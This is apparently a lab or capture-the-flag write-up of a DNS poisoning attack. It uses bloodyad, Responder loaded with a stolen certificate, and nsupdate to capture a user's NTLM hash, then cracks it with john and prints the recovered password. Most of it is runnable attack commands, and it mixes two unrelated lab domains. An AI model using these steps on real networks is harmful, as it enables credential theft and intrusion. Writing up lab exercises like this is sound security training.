
Assuming we have retrieved an .pfx file and extracted the certificate and private key. We can potentially perform an DNS Poisoning Attack in order to capture an NTLM Hash of the target server.

---
## PoC

Check if we have permissions to add DNS Entries.

```
KRB5CCNAME=jaylee.clifton.ccache bloodyad --host DC01.logging.htb -d logging.htb -k get writable
```

The capturing itself will be via "responder" and we will utilize the retrieved certificate and private key to configure our responder, so we are actually able to trick the server that we are "authenticated". So we can capture the NTLM Hash.

1. We will add the key.pem and key.cert file into /usr/share/responder/certs

```
cp key.pem key.cert /usr/share/responder/certs
```

2. Modified the Responder.conf file

```
SSLCert = certs/key.cert
SSLKey = certs/key.pem
```

3. Utilized "nsupdate" to update the DNS Entry and to point it to our local machine ip. So we can capture the NTLM Hash with Responder

```
nsupdate
```

```
> server <target_ip>
> update delete selfservice.windcorp.thm
> send
> update add selfservice.windcorp.thm 1234 A <local_ip>
> send
> quit
```

4. Started up responder

```
responder -I tun0
```

5. Reloaded Website fire.windcorp.thm and captured NTLM Hash of user "edwardle".

Stored it in an file locally and bruteforced an password utilizing john the ripper.

```
john edwardle --wordlist=/usr/share/wordlists/rockyou.txt
```

Gained new credentials.

```
edwardle:!Angelus25!
```

Before proceeding I will modify the Responder.conf again to point to the original .crt and .key file.

```
; Configure SSL Certificates to use
SSLCert = certs/responder.crt
SSLKey = certs/responder.key
```
